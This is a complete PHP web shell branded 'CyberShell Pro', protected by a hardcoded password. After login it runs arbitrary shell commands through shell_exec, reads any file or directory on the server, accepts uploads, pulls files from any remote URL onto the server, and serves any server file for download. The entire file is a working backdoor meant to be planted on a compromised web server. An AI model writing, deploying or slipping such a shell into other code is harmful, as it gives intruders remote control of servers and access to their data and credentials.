<?php
session_start();

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Define the expected password
    $expectedPassword = 'shuju@123'; // Replace 'hacker1337' with your desired password

    // Get the entered password from the form
    $enteredPassword = $_POST['password'];

    // Check if the entered password matches the expected password
    if ($enteredPassword === $expectedPassword) {
        // Password is correct, set the session variable
        $_SESSION['authenticated'] = true;
    } else {
        // Password is incorrect, display an error message
        echo 'Invalid password. Access denied.';
    }
}

// Check if the user is not logged in, display the login form
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <style>
        :root {
            --primary: #00ff88;
            --dark: #0a0a0a;
            --light: #1a1a1a;
            --text: #ffffff;
            --danger: #ff4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); 
            color: var(--text); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            text-align: center;
            background: rgba(45, 45, 45, 0.95);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            border: 1px solid #333;
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo img {
            max-width: 200px;
            height: auto;
            margin-bottom: 20px;
        }
        
        .logo h1 {
            color: var(--primary);
            margin: 10px 0;
            font-size: 1.5rem;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #ccc;
            font-weight: 500;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: rgba(26, 26, 26, 0.9);
            border: 1px solid #444;
            color: white;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        input[type="password"]:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: black;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00cc6a;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .error {
            background: rgba(255, 68, 68, 0.2);
            color: #ff6b6b;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        
        .footer {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://shuju.to/assets/logo.png" alt="Security Portal Logo" onerror="this.style.display='none'">
            <h1>SECURE ACCESS PORTAL</h1>
        </div>
        
        <h2>Access Requested?</h2>
        <form method="POST" action="">
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" name="password" id="password" required>
            </div>
            <button type="submit">Submit</button>
        </form>
        
        <div class="footer">
            Authorized Personnel Only
        </div>
    </div>
</body>
</html>
    <?php
    // Stop executing the rest of the script
    exit();
}

// Logout functionality
if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
    // Destroy the session and redirect to the login form
    session_destroy();
    header('Location: web_shell.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberShell Pro</title>
    <style>
        :root {
            --primary: #00ff88;
            --primary-dark: #00cc6a;
            --dark: #0a0a0a;
            --darker: #050505;
            --light: #1a1a1a;
            --lighter: #2a2a2a;
            --text: #ffffff;
            --text-muted: #aaaaaa;
            --danger: #ff4444;
            --warning: #ffaa00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: var(--dark);
            color: var(--text);
            line-height: 1.6;
        }
        
        .header {
            background: var(--darker);
            padding: 15px 0;
            border-bottom: 2px solid var(--primary);
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-container img {
            height: 35px;
            width: auto;
        }
        
        .logo-text {
            font-size: 1.3rem;
            font-weight: bold;
            color: var(--primary);
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
        }
        
        .panel {
            background: var(--light);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            border-left: 4px solid var(--primary);
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        
        .panel-title {
            color: var(--primary);
            font-size: 1.2rem;
            font-weight: bold;
            margin: 0;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-muted);
            font-weight: 500;
        }
        
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px 12px;
            background: var(--darker);
            border: 1px solid #333;
            color: white;
            border-radius: 6px;
            font-size: 0.95rem;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
        }
        
        .btn {
            background: var(--primary);
            color: black;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 6px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        
        .btn:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #cc3333;
        }
        
        .output {
            background: var(--darker);
            padding: 15px;
            border-radius: 6px;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #333;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        
        .file-list {
            background: var(--darker);
            border-radius: 6px;
            border: 1px solid #333;
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid #333;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-icon {
            font-size: 1.2rem;
            width: 20px;
            text-align: center;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 6px;
            margin-bottom: 15px;
        }
        
        .alert-success {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
            color: var(--primary);
        }
        
        .alert-error {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            color: #ff6b6b;
        }
        
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .quick-command {
            background: var(--darker);
            border: 1px solid #333;
            color: var(--text);
            padding: 8px;
            border-radius: 6px;
            cursor: pointer;
            text-align: center;
            font-size: 0.9rem;
            transition: all 0.2s;
        }
        
        .quick-command:hover {
            background: var(--lighter);
            border-color: var(--primary);
        }
        
        .section-title {
            color: var(--primary);
            font-size: 1.4rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--primary);
        }
        
        .form-inline {
            display: flex;
            gap: 10px;
            align-items: end;
            flex-wrap: wrap;
        }
        
        .form-inline .form-group {
            flex: 1;
            min-width: 200px;
            margin-bottom: 0;
        }
        
        hr {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
            margin: 30px 0;
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
            
            .quick-commands {
                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            }
            
            .container {
                padding: 0 10px;
            }
            
            .panel {
                padding: 15px;
            }
            
            .form-inline {
                flex-direction: column;
            }
            
            .form-inline .form-group {
                min-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo-container">
                <img src="https://shuju.to/assets/logo.png" alt="CyberShell Pro Logo" onerror="this.style.display='none'">
                <div class="logo-text">CyberShell Pro</div>
            </div>
            <div class="user-info">
                <span>Active Session</span>
                <form method="post" style="display: inline;">
                    <input type="hidden" name="logout" value="true">
                    <button type="submit" class="btn btn-danger">Logout</button>
                </form>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- Remote Code Execution -->
        <div class="panel">
            <h2 class="section-title">🚀 Remote Code Execution</h2>
            
            <div class="quick-commands">
                <div class="quick-command" onclick="insertCommand('pwd')">pwd</div>
                <div class="quick-command" onclick="insertCommand('ls -la')">ls -la</div>
                <div class="quick-command" onclick="insertCommand('whoami')">whoami</div>
                <div class="quick-command" onclick="insertCommand('id')">id</div>
                <div class="quick-command" onclick="insertCommand('uname -a')">uname -a</div>
                <div class="quick-command" onclick="insertCommand('ps aux')">ps aux</div>
                <div class="quick-command" onclick="insertCommand('df -h')">df -h</div>
                <div class="quick-command" onclick="insertCommand('free -h')">free -h</div>
            </div>
            
            <form method="GET" action="">
                <div class="form-inline">
                    <div class="form-group">
                        <label for="command">Command:</label>
                        <input type="text" name="command" id="command" size="50" value="<?php if (isset($_GET['command'])) { echo htmlspecialchars($_GET['command']); } ?>" />
                    </div>
                    <button type="submit" class="btn">Execute</button>
                </div>
            </form>
            <?php
            if (isset($_GET['command'])) {
                $command = $_GET['command'];
                echo '<div class="output">';
                echo 'Command: ' . $command . "\n";
                echo 'Output:' . "\n";
                echo shell_exec($command);
                echo '</div>';
            }
            ?>
        </div>

        <hr />

        <!-- Retrieve File/Scan Directory -->
        <div class="panel">
            <h2 class="section-title">📁 Retrieve File/Scan Directory</h2>
            <div class="form-group">
                <label>Current file path:</label>
                <div class="output" style="margin: 0; max-height: none;"><?php echo __FILE__; ?></div>
            </div>
            
            <form method="GET" action="">
                <div class="form-inline">
                    <div class="form-group">
                        <label for="path">Path:</label>
                        <input type="text" name="path" id="path" size="50" value="<?php if (isset($_GET['path'])) { echo $_GET['path']; } ?>" />
                    </div>
                    <button type="submit" class="btn">Browse</button>
                </div>
            </form>
            
            <?php if (isset($_GET['path'])): ?>
            <div class="output">
                <?php
                if ($_GET['path'] == '') {
                    $path = './';
                } else {
                    $path = $_GET['path'];
                }
                echo '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />';
                echo '<b>Type:</b> ';
                if (is_dir($path)) {
                    echo 'Directory <br />';
                    foreach (scandir($path) as $data) {
                        echo $data . "<br />";
                    }
                } else {
                    echo 'File <br />';
                    print_r(file_get_contents($path));
                }
                ?>
            </div>
            <?php endif; ?>
        </div>

        <hr />

        <!-- Upload File From Local Machine -->
        <div class="panel">
            <h2 class="section-title">📤 Upload File From Your Local Machine</h2>
            <form method="POST" action="" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="uploads">File(s):</label>
                    <input type="file" name="uploads[]" id="uploads" multiple="multiple" required="required" />
                </div>
                <button type="submit" class="btn">Upload</button>
            </form>
            <?php
            if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
                $total = count($_FILES['uploads']['name']);
                for ($i = 0; $i < $total; $i++) {
                    $tmpPath = $_FILES['uploads']['tmp_name'][$i];
                    if ($tmpPath != '') {
                        $newPath = './' . $_FILES['uploads']['name'][$i];
                        if (move_uploaded_file($tmpPath, $newPath)) {
                            echo '<div class="alert alert-success">Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '</div>';
                        } else {
                            echo '<div class="alert alert-error">Unable to upload ' . $_FILES['uploads']['name'][$i] . '</div>';
                        }
                    }
                }
            }
            ?>
        </div>

        <hr />

        <!-- Upload File From URL -->
        <div class="panel">
            <h2 class="section-title">🌐 Upload File From URL</h2>
            <form method="POST" action="">
                <div class="form-group">
                    <label for="save_name">Filename to save:</label>
                    <input type="text" name="save_name" id="save_name" size="30" required="required" />
                </div>
                <div class="form-group">
                    <label for="url">URL:</label>
                    <input type="text" name="url" id="url" size="50" required="required" />
                </div>
                <button type="submit" class="btn">Upload</button>
            </form>
            <?php if (isset($_POST['save_name']) && isset($_POST['url'])): ?>
            <div class="output">
                <?php
                if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) {
                    echo 'Successfully uploaded ' . $_POST['save_name'];
                } else {
                    echo 'Unable to upload ' . $_POST['save_name'];
                }
                ?>
            </div>
            <?php endif; ?>
        </div>

        <hr />

        <!-- Download File From Web Server -->
        <div class="panel">
            <h2 class="section-title">📥 Download File From Web Server</h2>
            <form method="GET" action="">
                <div class="form-group">
                    <label for="download">Filename to download:</label>
                    <input type="text" name="download" id="download" size="100" required="required" />
                </div>
                <button type="submit" class="btn">Download</button>
            </form>

            <?php
            if (isset($_GET['download'])) {
                $filename = $_GET['download'];
                if (file_exists($filename)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
                    header('Content-Length: ' . filesize($filename));
                    ob_clean();
                    flush();
                    readfile($filename);
                    exit;
                } else {
                    echo '<div class="alert alert-error">File does not exist.</div>';
                }
            }
            ?>
        </div>

        <hr />

        <!-- Logout -->
        <div class="panel">
            <h2 class="section-title">🔒 Session Management</h2>
            <form method="POST" action="">
                <input type="hidden" name="logout" value="true" />
                <button type="submit" class="btn btn-danger">Logout</button>
            </form>
        </div>
    </div>

    <script>
        function insertCommand(cmd) {
            document.getElementById('command').value = cmd;
            document.getElementById('command').focus();
        }
        
        // Auto-focus command input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const commandInput = document.getElementById('command');
            if (commandInput) {
                commandInput.focus();
            }
        });
        
        // Handle image loading errors
        document.addEventListener('DOMContentLoaded', function() {
            const images = document.querySelectorAll('img');
            images.forEach(img => {
                img.onerror = function() {
                    this.style.display = 'none';
                };
            });
        });
    </script>
</body>
</html>
